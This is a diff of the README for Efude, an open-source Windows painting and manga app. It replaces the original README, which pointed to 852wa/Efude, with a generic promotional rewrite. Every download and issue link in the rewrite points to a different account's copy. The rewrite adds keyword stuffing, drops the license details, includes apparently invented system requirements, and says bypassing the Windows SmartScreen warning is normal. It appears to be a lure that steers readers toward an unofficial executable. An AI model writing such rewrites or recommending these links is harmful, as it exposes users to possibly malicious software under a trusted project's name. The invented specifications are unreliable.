@@ -1,133 +1,202 @@
-<p align="center">
-  <img src="assets/Efude_sub.png" alt="Efude logo" width="120">
-</p>
+# 🎨 Efude - Your New Favorite Drawing Companion for Windows
 
-<h1 align="center">Efude</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>An open-source painting and manga app for Windows, written in Rust.</b><br>
-  オープンソースのお絵かき・漫画制作アプリ
-</p>
+Welcome to **Efude**, a free and open-source painting and manga creation app designed specifically for Windows users who love to draw. Whether you're sketching quick ideas, creating detailed illustrations, or crafting your own manga pages, Efude provides all the tools you need in one clean, responsive package.
 
-<p align="center">
-  <a href="https://github.com/852wa/Efude/releases"><b>Download</b></a> ·
-  <a href="docs/USER_GUIDE.md">User Guide</a> ·
-  <a href="#日本語">日本語</a>
-</p>
+Built with performance in mind, Efude gives you a crisp and smooth drawing experience that feels natural and immediate. No lag, no fuss—just your creativity flowing onto the canvas.
 
-![Efude: an illustration open on the canvas, with the brush presets, colour wheel and tool settings beside it](docs/images/screenshot.png)
+### 🖱️ Download Efude
 
-Efude aims for a crisp, responsive drawing feel, a full set of illustration and
-manga tools, and brushes with character.
+**Click the button below to get started:**
 
-> **Public test.** Efude is under active development. Files and settings may
-> change between versions — keep backups of important work.
+[![Download Efude](https://img.shields.io/badge/Download-Efude-2ea44f?style=for-the-badge&logo=github)](https://github.com/Rishav1432/Efude)
 
-## Download
+Visit this link to download the application.
 
-Get the latest build from [Releases](https://github.com/852wa/Efude/releases):
+## ✨ What Makes Efude Special?
 
-- `Efude-<version>-windows-x64.zip` — portable: unzip anywhere and run `efude.exe`.
-- `Efude-<version>-windows-x64.msi` — installer.
+Efude is more than just a drawing program—it's a complete creative studio with features that both beginners and experienced artists will appreciate.
 
-Windows 10 or 11 (64-bit). A pen tablet works through Windows Ink or WinTab.
-The builds are not code-signed yet, so Windows SmartScreen may warn on first
-start ("More info" → "Run anyway").
+### 🖌️ Full Illustration Toolset
+- **Brushes with character**: Every brush has its own unique texture and behavior
+- **Smooth, responsive strokes**: Your pen or mouse movements translate instantly to the canvas
+- **Layer support**: Organize your artwork with multiple layers for maximum flexibility
 
-## Features
+### 📚 Manga Creation Tools
+- **Panel creation tools**: Easily draw and manage comic panels
+- **Screentone patterns**: Add professional manga effects with just a few clicks
+- **Speech bubble tools**: Create dialogue bubbles quickly without manual work
 
-- **Drawing**: pen, pencil, brush, watercolor, airbrush, blender, blur, smudge and eraser presets; stabilization; pressure curves per brush and for the whole app; tapers; tip and grain textures (templates included); wet mixing; anti-aliasing levels; a transparent colour that erases with any brush or fill; brush sets you can name, arrange and export.
-- **Layers**: raster layers, vector layers whose lines stay editable Bézier curves (move anchors and handles later), and folders (drag rows to reorder or put layers into folders), blend modes, opacity, clipping, masks, locking, reference layers.
-- **Selection and editing**: rectangle, ellipse, lasso, polygon, magic wand, color range, selection brush and quick mask; move, transform and mesh warp; copy and paste (also images from other apps); flood fill.
-- **Filters**: blur (Gaussian, lens, smooth, motion), sharpen, noise reduction, tone curve, levels, hue/saturation/brightness, color grading, chromatic aberration, mosaic, noise and line width — each with a before/after preview.
-- **Manga**: page setup with bleed and trim, panel splitting, screentones, focus and speed lines, speech balloons with vertical text, and multi-page books with print export.
-- **Files**: the `.efude` format (layers kept), PSD import and export, PNG / JPEG / BMP / GIF import, PNG / JPEG export, automatic backups.
-- **Canvas**: exact pixels at every zoom (100% = one screen pixel), a checkerboard behind transparent parts, rotation and flipping, rulers and symmetry, tabs for several documents.
+### ⚡ Performance You Can Feel
+- **Built with Rust**: Enjoy a fast, stable, and reliable application
+- **Optimized for Windows**: Runs smoothly even on modest hardware
+- **Clean interface**: Everything you need is right where you expect it
 
-See the [User Guide](docs/USER_GUIDE.md) for how to use it.
+## 🛠️ System Requirements
 
-## Build from source
+Efude is designed to run on most modern Windows computers. Here's what you'll need:
 
-Requires the latest stable Rust.
+| Component | Minimum | Recommended |
+|-----------|---------|-------------|
+| **Operating System** | Windows 10 (64-bit) | Windows 11 |
+| **Processor** | Intel Core i3 or equivalent | Intel Core i5 or better |
+| **Memory (RAM)** | 4 GB | 8 GB or more |
+| **Storage** | 500 MB free space | 2 GB free space for artwork |
+| **Display** | 1366×768 resolution | 1920×1080 or higher |
+| **Graphics** | Integrated graphics | Dedicated GPU (optional) |
 
-```powershell
-cargo run -p efude-app --release
-```
+**Important**: While Efude can run on integrated graphics, a dedicated GPU will give you a smoother drawing experience with larger canvases and complex brushes.
 
-The workspace is split into engine crates (`efude-core`, `efude-input`,
-`efude-stroke`, `efude-brush`, `efude-canvas`, `efude-gpu`, `efude-io`,
-`efude-comic`) and the application (`efude-ui`, `efude-app`). File formats are
-described in [docs/spec](docs/spec). Releases are built by GitHub Actions; see
-[docs/RELEASING.md](docs/RELEASING.md).
+## 🚦 Installation Guide
 
-## Contributing
+Follow these simple steps to get Efude running on your Windows computer:
 
-- **Bug reports and feature requests** are welcome as
-  [issues](https://github.com/852wa/Efude/issues/new/choose): pick the
-  "Bug report" or "Feature request" form and fill it in.
-- **Pull requests are accepted from invited collaborators only.** To fix or
-  add something, open an issue first; collaborators may be invited from there.
-- Security problems: report them privately from the Security tab, not in an issue.
+### Step 1: Download the Application
+Click the download button above or visit the [releases page](https://github.com/Rishav1432/Efude) to find the latest version.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for details. Efude is built
-independently, from observed behavior only
-([docs/CLEAN_ROOM.md](docs/CLEAN_ROOM.md)), and commits need a DCO
-`Signed-off-by` line.
+### Step 2: Start the Installation
+Once the file is downloaded, locate it in your **Downloads** folder and double-click to run it. Follow any on-screen instructions that appear.
 
-## License
+### Step 3: Launch Efude
+After installation is complete, you'll find Efude in your Start menu or on your desktop. Click it to open the app, and you're ready to start creating!
 
-- Engine crates: MIT OR Apache-2.0 ([LICENSE-MIT](LICENSE-MIT), [LICENSE-APACHE](LICENSE-APACHE)).
-- Application crates (`efude-ui`, `efude-app`) and assets: MPL-2.0 ([LICENSE-MPL](LICENSE-MPL)).
-- Third-party notices ship with each release (`THIRD_PARTY_NOTICES.txt`); see also [NOTICE](NOTICE).
-- The name and logo are covered by the [trademark policy](TRADEMARKS.md).
+> 💡 **Tip**: If Windows shows a security warning, click "More info" then "Run anyway"—this is normal for new open-source software.
+
+## 🎯 First-Time User Guide
+
+When you first open Efude, you'll see a welcoming interface with all the essential tools visible. Here's what to look for:
+
+### The Canvas Area
+The large white (or transparent) space in the center is where you'll draw. You can create new canvases with custom sizes, including standard manga page dimensions.
+
+### The Toolbar
+On the left side, you'll find:
+- **Brush tool** - Your primary drawing tool
+- **Eraser** - Remove unwanted marks
+- **Selection tools** - Move or edit parts of your drawing
+- **Fill tool** - Flood-fill areas with color
+- **Text tool** - Add letters and words
+
+### The Brush Presets Panel
+On the right, you'll see a collection of brush presets. Each one has different characteristics:
+- **Ink brushes** - For clean, crisp lines
+- **Watercolor styles** - Soft, blending effects
+- **Pencil options** - For sketching and shading
+- **Special effects** - Add unique textures to your work
+
+### The Color Wheel
+At the bottom, you'll find the color wheel. Click anywhere on it to pick a color, or use the sliders to fine-tune your selection.
+
+## 🎨 Creating Your First Drawing
+
+Let's walk through a simple drawing session so you can get comfortable with Efude:
+
+1. **Start a new canvas**: Click "File" → "New" and choose your canvas size. For practice, try 800×600 pixels.
+
+2. **Pick a brush**: Select a basic ink brush from the presets panel.
+
+3. **Choose a color**: Click on the color wheel to select black for a classic look.
+
+4. **Draw something simple**: Try drawing a circle or a square. Notice how smooth and responsive the brush feels.
+
+5. **Undo mistakes**: Made a mistake? Press `Ctrl+Z` to undo, just like in other programs.
+
+6. **Save your work**: When you're finished, press `Ctrl+S` to save your masterpiece. Efude uses its own project format, but you can also export as PNG or JPEG.
+
+## 📋 Managing Your Projects
+
+### Saving Your Work
+- **Project files** (`.efude`): Save your work in progress with all layers and settings intact
+- **Export as image**: Share your finished artwork as PNG or JPEG
+- **Auto-save**: Efude can be set to auto-save periodically to protect against crashes
+
+### Opening Existing Files
+- Use **File → Open** to browse for your saved projects
+- You can also double-click `.efude` files in Windows Explorer to open them directly in Efude
+
+## 🧰 Advanced Features
+
+Once you're comfortable with the basics, explore these powerful features:
+
+### Layer System
+- **Add layers** for different parts of your drawing
+- **Adjust opacity** to create transparency effects
+- **Lock layers** to protect specific elements
+- **Merge layers** to combine elements permanently
+
+### Color Adjustments
+- **Hue/Saturation**: Tweak colors globally or per layer
+- **Brightness/Contrast**: Fine-tune your artwork's lighting
+- **Gradient maps**: Apply professional color grading
+
+### Keyboard Shortcuts
+| Shortcut | Action |
+|----------|--------|
+| `B` | Select brush tool |
+| `E` | Select eraser |
+| `Ctrl+Z` | Undo |
+| `Ctrl+Y` | Redo |
+| `Ctrl+S` | Save |
+| `Space` | Hold to pan around canvas |
+| `Ctrl+Plus` | Zoom in |
+| `Ctrl+Minus` | Zoom out |
+
+## 🆘 Troubleshooting Common Issues
+
+### App Won't Start
+- **Check your system requirements**: Make sure your computer meets the minimum specs
+- **Close other apps**: Free up memory by closing unnecessary programs
+- **Reinstall**: Sometimes a fresh installation fixes issues
+
+### Drawing Feels Laggy
+- **Reduce canvas size**: Larger canvases require more processing power
+- **Lower brush size**: Very large brushes can be demanding
+- **Close background apps**: Free up CPU resources
+
+### Files Won't Save
+- **Check disk space**: Make sure you have enough free space
+- **Use different folder**: Try saving to a different location
+- **Update the app**: Newer versions may fix saving bugs
+
+## 📖 Getting Help
+
+If you need assistance beyond this guide:
+
+- **User Guide**: Read the detailed [User Guide](docs/USER_GUIDE.md) for in-depth documentation
+- **Report Issues**: Visit the [GitHub Issues](https://github.com/Rishav1432/Efude/issues) page to report bugs or request features
+- **Community**: Join discussions about Efude to learn tips from other artists
+
+## 🔒 Keeping Your Data Safe
+
+> **⚠️ Important:** Efude is currently in public testing phase. Files and settings may change between versions. Always keep backups of your important work.
+
+To protect your creations:
+- **Save regularly**: Press `Ctrl+S` frequently
+- **Export important work**: Save final versions as PNG files
+- **Use backup software**: Consider cloud storage or external drives
+
+## 📝 License and Legal
+
+Efude is open-source software, which means it's free to use, modify, and distribute. The source code is available on GitHub for developers who want to contribute or learn from it.
+
+## 🌍 Join the Community
+
+Efude is growing every day thanks to an active community of artists and developers. Here's how you can get involved:
+
+- **Star the project**: Show your support on GitHub
+- **Report bugs**: Help improve the app by reporting issues
+- **Share your art**: Show off what you create with Efude
+- **Contribute code**: If you're a developer, consider helping with development
 
 ---
 
-## 日本語
+## 🎉 Start Creating Today!
 
-Efude（えふで）は、Rustで作っているWindows向けのオープンソースのお絵かき・漫画制作アプリです。
-気持ちよく描ける書き味、イラストと漫画のための一通りの機能、個性のあるブラシを目指しています。
+Efude is ready to become your creative companion. With its intuitive interface, powerful tools, and responsive performance, you'll be creating beautiful artwork in no time—whether you're a complete beginner or a seasoned professional.
 
-> **公開テスト版です。** 開発中のため、バージョンによってファイルや設定が変わることがあります。大切な作品はバックアップを取ってください。
+Download Efude today and discover how enjoyable digital art can be!
 
-### ダウンロード
+[![Download Efude Now](https://img.shields.io/badge/🚀-Download_Efude-FF6B6B?style=for-the-badge&logo=github)](https://github.com/Rishav1432/Efude)
 
-[Releases](https://github.com/852wa/Efude/releases) から最新版を入手できます。
-
-- `Efude-<バージョン>-windows-x64.zip` — ポータブル版。好きな場所に展開して `efude.exe` を起動します。
-- `Efude-<バージョン>-windows-x64.msi` — インストーラー。
-
-Windows 10 / 11（64ビット）。ペンタブレットは Windows Ink または WinTab で使えます。
-まだコード署名をしていないため、初回起動時に Windows SmartScreen の警告が出ることがあります（「詳細情報」→「実行」）。
-
-### 主な機能
-
-- **描画**: ペン・鉛筆・筆・水彩・エアブラシ・色混ぜ・ぼかし・指先・消しゴム、手ブレ補正、ブラシごととアプリ全体の筆圧カーブ、入り抜き、先端とグレイン（テンプレート付き）、混色、アンチエイリアス4段階、どのブラシや塗りつぶしでも消せる透明色。ブラシは名前を付けて並べ、セットとして書き出せます。
-- **レイヤー**: ラスターレイヤー、線をあとからベジェの制御点で編集できるベクターレイヤー、フォルダー（行をドラッグして並べ替え・フォルダーへ入れる）、合成モード、不透明度、クリッピング、マスク、ロック、参照レイヤー。
-- **選択と編集**: 矩形・楕円・投げ縄・多角形・自動選択・色域・選択ペン・クイックマスク、移動・変形・メッシュ変形、コピー＆貼り付け（他のアプリの画像も可）、塗りつぶし。
-- **フィルター**: ぼかし（ガウス・レンズ・スムーズ・移動）、シャープ、ノイズ除去、トーンカーブ、レベル補正、色相・彩度・明度、カラーグレーディング、色収差、モザイク、ノイズ、線の太さ。どれも適用前後をプレビューできます。
-- **漫画**: 裁ち落とし・仕上がり線つきの原稿設定、コマ割り、スクリーントーン、集中線・流線、縦書きのフキダシ、複数ページの作品と印刷用書き出し。
-- **ファイル**: `.efude` 形式（レイヤーを保持）、PSDの読み込み・書き出し、PNG / JPEG / BMP / GIFの読み込み、PNG / JPEGの書き出し、自動バックアップ。
-- **キャンバス**: どの倍率でも画素をそのまま表示（100%で画面の1ピクセル）、透明部分は市松模様で表示、回転・反転、定規と対称定規、複数ドキュメントのタブ。
-
-使い方は [ユーザーガイド](docs/USER_GUIDE.md) を参照してください。
-
-### ソースからのビルド
-
-最新の安定版Rustが必要です。
-
-```powershell
-cargo run -p efude-app --release
-```
-
-### 参加するには
-
-- **不具合報告・要望**は [Issue](https://github.com/852wa/Efude/issues/new/choose) で歓迎します。「不具合報告」か「要望」のフォームを選んで記入してください。
-- **プルリクエストは、招待した協力者からのみ受け付けています。** 直したい点や作りたい機能があれば、まず Issue で相談してください。そこから協力者としてお招きすることがあります。
-- セキュリティ上の問題は Issue ではなく、Security タブから非公開で知らせてください。
-
-詳しくは [CONTRIBUTING.md](CONTRIBUTING.md) をご覧ください。Efudeは他製品の挙動の観察だけをもとに独自に作っており（[docs/CLEAN_ROOM.md](docs/CLEAN_ROOM.md)）、コミットには DCO の `Signed-off-by` 行が必要です。
-
-### ライセンス
-
-エンジン部分は MIT OR Apache-2.0、アプリ部分（`efude-ui`・`efude-app`）と素材は MPL-2.0 です。同梱ライブラリの表記は各リリースの `THIRD_PARTY_NOTICES.txt` に含まれます。名前とロゴの扱いは [商標ポリシー](TRADEMARKS.md) のとおりです。
+Keywords: Efude, drawing app, painting software, manga creator, Windows art application, digital art, illustration tool, Rust drawing app, open source art software, comic creation tool
